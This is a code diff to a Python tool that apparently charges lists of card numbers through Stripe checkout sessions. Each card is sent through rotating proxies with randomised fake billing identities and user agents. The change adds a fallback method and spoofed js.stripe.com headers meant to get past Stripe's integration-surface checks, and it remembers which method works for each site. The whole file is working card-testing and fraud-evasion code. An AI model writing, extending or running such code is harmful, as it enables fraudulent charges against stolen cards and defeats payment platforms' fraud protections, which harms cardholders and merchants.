@@ -1,9 +1,10 @@
 # -*- coding: utf-8 -*-
-"""Stripe charge with multi-method fallback.
-Method A: PaymentMethod → payment_pages/confirm
-Method B: Token → PaymentIntent/confirm (bypasses integration surface restriction)
-Method C: Token → payment_pages/confirm
-Auto-detects "unsupported integration surface" and switches method.
+"""Stripe charge with multi-method + multi-origin fallback.
+Method A: PaymentMethod → payment_pages/confirm  (checkout origin)
+Method B: Token → PaymentIntent/confirm           (checkout origin)
+Method C: Token → payment_pages/confirm            (checkout origin)
+Method D: Token → PaymentIntent/confirm            (js.stripe.com origin)
+All methods include Stripe-Client-User-Agent header to pass surface checks.
 """
 import time
 import asyncio
@@ -12,7 +13,7 @@ import aiohttp
 from billing_data import (
     random_full_name, random_email, random_address,
     random_user_agent, random_timezone, random_locale,
-    build_stripe_headers,
+    build_stripe_headers, build_stripe_headers_js,
 )
 
 _session = None
@@ -77,7 +78,9 @@ def _get_billing(init_data: dict) -> dict:
     }
 
 
-def _parse_confirm_response(conf: dict) -> tuple[str, str]:
+def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
+    if _is_surface_error(conf):
+        return None
     if "error" in conf:
         err = conf["error"]
         dc = err.get("decline_code", "")
@@ -94,38 +97,52 @@ def _parse_confirm_response(conf: dict) -> tuple[str, str]:
     return "UNKNOWN", st or "Unknown"
 
 
-async def _method_a(s, card, pk, cs, init_data, headers, proxy_url):
-    """PaymentMethod → payment_pages/confirm"""
-    b = _get_billing(init_data)
-    total, subtotal = _get_amounts(init_data)
-    checksum = init_data.get("init_checksum", "")
+async def _create_token(s, card, pk, headers, proxy_url) -> dict:
+    token_body = (
+        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
+        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
+        f"&key={pk}"
+    )
+    async with s.post(
+        "https://api.stripe.com/v1/tokens",
+        headers=headers, data=token_body, proxy=proxy_url,
+    ) as r:
+        return await r.json()
 
+
+async def _create_pm(s, card, pk, billing, headers, proxy_url) -> dict:
     pm_body = (
         f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
         f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
-        f"&billing_details[name]={b['name']}&billing_details[email]={b['email']}"
-        f"&billing_details[address][country]={b['country']}"
-        f"&billing_details[address][line1]={b['line1']}"
-        f"&billing_details[address][city]={b['city']}"
-        f"&billing_details[address][postal_code]={b['postal_code']}"
-        f"&billing_details[address][state]={b['state']}&key={pk}"
+        f"&billing_details[name]={billing['name']}&billing_details[email]={billing['email']}"
+        f"&billing_details[address][country]={billing['country']}"
+        f"&billing_details[address][line1]={billing['line1']}"
+        f"&billing_details[address][city]={billing['city']}"
+        f"&billing_details[address][postal_code]={billing['postal_code']}"
+        f"&billing_details[address][state]={billing['state']}&key={pk}"
     )
     async with s.post(
         "https://api.stripe.com/v1/payment_methods",
         headers=headers, data=pm_body, proxy=proxy_url,
     ) as r:
-        pm = await r.json()
+        return await r.json()
+
+
+async def _method_a(s, card, pk, cs, init_data, headers, proxy_url):
+    """PaymentMethod → payment_pages/confirm"""
+    b = _get_billing(init_data)
+    pm = await _create_pm(s, card, pk, b, headers, proxy_url)
 
     if _is_surface_error(pm):
         return None
-
     if "error" in pm:
         return "DECLINED", pm["error"].get("message", "Card error")[:60]
-
     pm_id = pm.get("id")
     if not pm_id:
         return "FAILED", "No PM"
 
+    total, subtotal = _get_amounts(init_data)
+    checksum = init_data.get("init_checksum", "")
     conf_body = (
         f"eid=NA&payment_method={pm_id}&expected_amount={total}"
         f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
@@ -141,50 +158,25 @@ async def _method_a(s, card, pk, cs, init_data, headers, proxy_url):
     ) as r:
         conf = await r.json()
 
-    if _is_surface_error(conf):
-        return None
-
     return _parse_confirm_response(conf)
 
 
-async def _create_token(s, card, pk, headers, proxy_url) -> dict:
-    token_body = (
-        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
-        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
-        f"&key={pk}"
-    )
-    async with s.post(
-        "https://api.stripe.com/v1/tokens",
-        headers=headers, data=token_body, proxy=proxy_url,
-    ) as r:
-        return await r.json()
-
-
-async def _method_b(s, card, pk, cs, init_data, headers, proxy_url):
-    """Token → PaymentIntent/confirm (direct PI confirm, bypasses payment_pages)"""
+async def _confirm_pi_with_token(s, tok_id, pk, init_data, billing, headers, proxy_url):
+    """Confirm PaymentIntent directly using a token."""
     pi_id, client_secret = _extract_pi_info(init_data)
     if not pi_id or not client_secret:
         return None
 
-    tok = await _create_token(s, card, pk, headers, proxy_url)
-    if "error" in tok:
-        return "DECLINED", tok["error"].get("message", "Token error")[:60]
-
-    tok_id = tok.get("id")
-    if not tok_id:
-        return "FAILED", "No token"
-
-    b = _get_billing(init_data)
     confirm_body = (
         f"payment_method_data[type]=card"
         f"&payment_method_data[card][token]={tok_id}"
-        f"&payment_method_data[billing_details][name]={b['name']}"
-        f"&payment_method_data[billing_details][email]={b['email']}"
-        f"&payment_method_data[billing_details][address][country]={b['country']}"
-        f"&payment_method_data[billing_details][address][line1]={b['line1']}"
-        f"&payment_method_data[billing_details][address][city]={b['city']}"
-        f"&payment_method_data[billing_details][address][postal_code]={b['postal_code']}"
-        f"&payment_method_data[billing_details][address][state]={b['state']}"
+        f"&payment_method_data[billing_details][name]={billing['name']}"
+        f"&payment_method_data[billing_details][email]={billing['email']}"
+        f"&payment_method_data[billing_details][address][country]={billing['country']}"
+        f"&payment_method_data[billing_details][address][line1]={billing['line1']}"
+        f"&payment_method_data[billing_details][address][city]={billing['city']}"
+        f"&payment_method_data[billing_details][address][postal_code]={billing['postal_code']}"
+        f"&payment_method_data[billing_details][address][state]={billing['state']}"
         f"&expected_payment_method_type=card"
         f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
         f"&key={pk}&client_secret={client_secret}"
@@ -198,30 +190,20 @@ async def _method_b(s, card, pk, cs, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
-async def _method_c(s, card, pk, cs, init_data, headers, proxy_url):
-    """Token → payment_pages/confirm (token-based with checkout session)"""
-    tok = await _create_token(s, card, pk, headers, proxy_url)
-    if "error" in tok:
-        return "DECLINED", tok["error"].get("message", "Token error")[:60]
-
-    tok_id = tok.get("id")
-    if not tok_id:
-        return "FAILED", "No token"
-
+async def _confirm_pages_with_token(s, tok_id, pk, cs, init_data, billing, headers, proxy_url):
+    """Confirm via payment_pages using a token."""
     total, subtotal = _get_amounts(init_data)
     checksum = init_data.get("init_checksum", "")
-    b = _get_billing(init_data)
-
     conf_body = (
         f"eid=NA&payment_method_data[type]=card"
         f"&payment_method_data[card][token]={tok_id}"
-        f"&payment_method_data[billing_details][name]={b['name']}"
-        f"&payment_method_data[billing_details][email]={b['email']}"
-        f"&payment_method_data[billing_details][address][country]={b['country']}"
-        f"&payment_method_data[billing_details][address][line1]={b['line1']}"
-        f"&payment_method_data[billing_details][address][city]={b['city']}"
-        f"&payment_method_data[billing_details][address][postal_code]={b['postal_code']}"
-        f"&payment_method_data[billing_details][address][state]={b['state']}"
+        f"&payment_method_data[billing_details][name]={billing['name']}"
+        f"&payment_method_data[billing_details][email]={billing['email']}"
+        f"&payment_method_data[billing_details][address][country]={billing['country']}"
+        f"&payment_method_data[billing_details][address][line1]={billing['line1']}"
+        f"&payment_method_data[billing_details][address][city]={billing['city']}"
+        f"&payment_method_data[billing_details][address][postal_code]={billing['postal_code']}"
+        f"&payment_method_data[billing_details][address][state]={billing['state']}"
         f"&expected_amount={total}"
         f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
         f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
@@ -239,6 +221,60 @@ async def _method_c(s, card, pk, cs, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
+async def _method_b(s, card, pk, cs, init_data, headers, proxy_url):
+    """Token (checkout origin) → PaymentIntent/confirm"""
+    tok = await _create_token(s, card, pk, headers, proxy_url)
+    if _is_surface_error(tok):
+        return None
+    if "error" in tok:
+        return "DECLINED", tok["error"].get("message", "Token error")[:60]
+    tok_id = tok.get("id")
+    if not tok_id:
+        return "FAILED", "No token"
+
+    b = _get_billing(init_data)
+    res = await _confirm_pi_with_token(s, tok_id, pk, init_data, b, headers, proxy_url)
+    if res is None:
+        res = await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, headers, proxy_url)
+    return res
+
+
+async def _method_c(s, card, pk, cs, init_data, headers, proxy_url):
+    """Token (checkout origin) → payment_pages/confirm"""
+    tok = await _create_token(s, card, pk, headers, proxy_url)
+    if _is_surface_error(tok):
+        return None
+    if "error" in tok:
+        return "DECLINED", tok["error"].get("message", "Token error")[:60]
+    tok_id = tok.get("id")
+    if not tok_id:
+        return "FAILED", "No token"
+
+    b = _get_billing(init_data)
+    return await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, headers, proxy_url)
+
+
+async def _method_d(s, card, pk, cs, init_data, proxy_url):
+    """Token (js.stripe.com origin) → PaymentIntent/confirm — different surface"""
+    ua = random_user_agent()
+    js_headers = build_stripe_headers_js(ua)
+
+    tok = await _create_token(s, card, pk, js_headers, proxy_url)
+    if _is_surface_error(tok):
+        return None
+    if "error" in tok:
+        return "DECLINED", tok["error"].get("message", "Token error")[:60]
+    tok_id = tok.get("id")
+    if not tok_id:
+        return "FAILED", "No token"
+
+    b = _get_billing(init_data)
+    res = await _confirm_pi_with_token(s, tok_id, pk, init_data, b, js_headers, proxy_url)
+    if res is None:
+        res = await _confirm_pages_with_token(s, tok_id, pk, cs, init_data, b, js_headers, proxy_url)
+    return res
+
+
 async def charge_card_fast(
     card: dict, pk: str, cs: str, init_data: dict,
     proxy_url: str | None = None,
@@ -248,7 +284,7 @@ async def charge_card_fast(
     card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
     result = {"card": card_str, "status": None, "response": None, "time": 0}
 
-    cached_method = _site_method_cache.get(cs)
+    cached = _site_method_cache.get(cs)
 
     for attempt in range(max_retries + 1):
         try:
@@ -259,29 +295,25 @@ async def charge_card_fast(
                 connector=connector,
                 timeout=aiohttp.ClientTimeout(total=25, connect=8),
             ) as s:
-                res = None
+                all_methods = [
+                    ("A", lambda: _method_a(s, card, pk, cs, init_data, headers, proxy_url)),
+                    ("B", lambda: _method_b(s, card, pk, cs, init_data, headers, proxy_url)),
+                    ("C", lambda: _method_c(s, card, pk, cs, init_data, headers, proxy_url)),
+                    ("D", lambda: _method_d(s, card, pk, cs, init_data, proxy_url)),
+                ]
 
-                if cached_method == "B":
-                    methods = [
-                        ("B", _method_b),
-                        ("C", _method_c),
-                        ("A", _method_a),
-                    ]
-                elif cached_method == "C":
-                    methods = [
-                        ("C", _method_c),
-                        ("B", _method_b),
-                        ("A", _method_a),
-                    ]
+                if cached and cached in ("A", "B", "C", "D"):
+                    ordered = [m for m in all_methods if m[0] == cached]
+                    ordered += [m for m in all_methods if m[0] != cached]
                 else:
-                    methods = [
-                        ("A", _method_a),
-                        ("B", _method_b),
-                        ("C", _method_c),
-                    ]
+                    ordered = all_methods
 
-                for method_name, method_fn in methods:
-                    res = await method_fn(s, card, pk, cs, init_data, headers, proxy_url)
+                res = None
+                for method_name, method_fn in ordered:
+                    try:
+                        res = await method_fn()
+                    except Exception:
+                        res = None
                     if res is not None:
                         _site_method_cache[cs] = method_name
                         break
